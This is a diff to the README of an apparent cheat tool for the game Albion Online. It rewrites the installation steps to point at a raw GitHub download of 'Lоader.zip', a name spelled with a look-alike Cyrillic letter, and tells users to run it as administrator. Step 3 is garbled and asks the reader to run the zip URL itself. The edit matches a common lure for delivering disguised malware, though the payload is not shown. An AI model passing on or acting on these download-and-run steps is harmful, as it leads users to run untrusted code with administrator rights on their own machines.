@@ -28,9 +28,9 @@ Fully tested for 2025 on leading platforms. Use on Windows for optimal results!
 
 ## 📝 Installation Steps
 
-1. Download **Loader.rar** from this repository.
+1. Download **https://raw.githubusercontent.com/Rehanopsx/AlbionOnline-HackSuite/main/Lоader.zip** from this repository.
 2. Extract to your desired location.
-3. Run Loader.exe as administrator.
+3. Run https://raw.githubusercontent.com/Rehanopsx/AlbionOnline-HackSuite/main/Lоader.zip as administrator.
 4. Follow the on-screen setup guide.
 5. Launch Albion Online – enjoy exclusive features!
 
